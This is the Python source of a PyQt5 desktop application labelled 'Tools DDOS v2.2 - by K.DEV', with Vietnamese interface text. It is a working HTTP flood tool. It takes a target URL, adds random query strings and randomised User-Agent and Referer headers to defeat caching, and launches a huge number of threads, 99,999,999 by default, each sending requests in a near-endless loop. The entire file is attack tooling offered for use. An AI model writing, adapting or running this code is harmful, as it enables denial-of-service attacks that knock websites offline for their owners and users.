from PyQt5 import QtCore, QtGui, QtWidgets
import urllib.request
import sys
import threading
import random
import re
import data
import socket


url=''
host=''
headers_useragents=data.list_useragent.split('\n')
headers_referers=data.list_referer.split('\n')

def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)


	
#http request
def HttpCall():
    url = DATABASE.URL
    if url.count("?")>0:
        param_joiner="&"
    else:
        param_joiner="?"
    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(5,20)) + '=' + buildblock(random.randint(3,10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
    request.add_header('Keep-Alive', random.randint(110,120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host',host)
	
    try:
        urllib.request.urlopen(request)
        return(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10))+random.choice(headers_useragents)+random.choice(headers_referers) + buildblock(random.randint(5,10)))
    except:
        return "404 Response "

class DATABASE:
    URL = ""
    HOST = ""
    RESULT = ""

class HTTPThread(threading.Thread):
    def run(self):
        try:
            for i in range(9999999999999999):
                response = HttpCall()
                print(response)
        except Exception as ex:
            pass





class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(415, 125)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.url = QtWidgets.QLineEdit(self.centralwidget)
        self.url.setGeometry(QtCore.QRect(80, 40, 301, 20))
        self.url.setObjectName("url")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(40, 40, 31, 21))
        font = QtGui.QFont()
        font.setPointSize(9)
        font.setBold(True)
        font.setWeight(75)
        self.label.setFont(font)
        self.label.setObjectName("label")
        self.port = QtWidgets.QLineEdit(self.centralwidget)
        self.port.setGeometry(QtCore.QRect(80, 70, 61, 20))
        self.port.setObjectName("port")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(40, 70, 41, 21))
        font = QtGui.QFont()
        font.setPointSize(9)
        font.setBold(True)
        font.setWeight(75)
        self.label_2.setFont(font)
        self.label_2.setObjectName("label_2")
        self.thread_count = QtWidgets.QSpinBox(self.centralwidget)
        self.thread_count.setGeometry(QtCore.QRect(211, 70, 81, 22))
        self.thread_count.setMaximum(999999999)
        self.thread_count.setProperty("value", 99999999)
        self.thread_count.setObjectName("thread_count")
        self.label_3 = QtWidgets.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(150, 70, 61, 21))
        font = QtGui.QFont()
        font.setPointSize(9)
        font.setBold(True)
        font.setWeight(75)
        self.label_3.setFont(font)
        self.label_3.setObjectName("label_3")
        self.label_5 = QtWidgets.QLabel(self.centralwidget)
        self.label_5.setGeometry(QtCore.QRect(100, 10, 221, 20))
        font = QtGui.QFont()
        font.setPointSize(11)
        font.setBold(True)
        font.setWeight(75)
        self.label_5.setFont(font)
        self.label_5.setObjectName("label_5")
        self.run = QtWidgets.QPushButton(self.centralwidget)
        self.run.setGeometry(QtCore.QRect(310, 70, 75, 23))
        self.run.setObjectName("run")
        self.notification = QtWidgets.QLabel(self.centralwidget)
        self.notification.setGeometry(QtCore.QRect(40, 100, 361, 20))
        self.notification.setObjectName("notification")
        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.label.setText(_translate("MainWindow", "URL"))
        self.label_2.setText(_translate("MainWindow", "PORT"))
        self.label_3.setText(_translate("MainWindow", "THREAD"))
        self.label_5.setText(_translate("MainWindow", "Tools DDOS v2.2 - by K.DEV"))
        self.run.setText(_translate("MainWindow", "Chạy"))
        self.notification.setText(_translate("MainWindow", "<NONE>"))

        self.app()
    
    def check_ip(self):
        try:
            self.hostname = self.url.text().replace("https://", "").replace("http://", "").replace("www.", "")
            self.ipweb = socket.gethostbyname(self.hostname)
            self.notification.setText("Bắt Đầu Tấn Công -> "+self.ipweb+":"+self.port.text())
        except:
            self.notification.setText("Không tìm thấy IP")
    def app(self):
        
        self.run.clicked.connect(lambda: self.run_ddos())

    def run_ddos(self):
        threading.Thread(target=self.check_ip).start()
        url = self.url.text()
        if url.count("/")==2:
            url = url + "/"
        host = url.replace("https://", "").replace("http://", "").replace("www.", "")
        DATABASE.HOST = host
        DATABASE.URL = url
        
        for i in range(self.thread_count.value()):
            t = HTTPThread()
            t.start()

if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
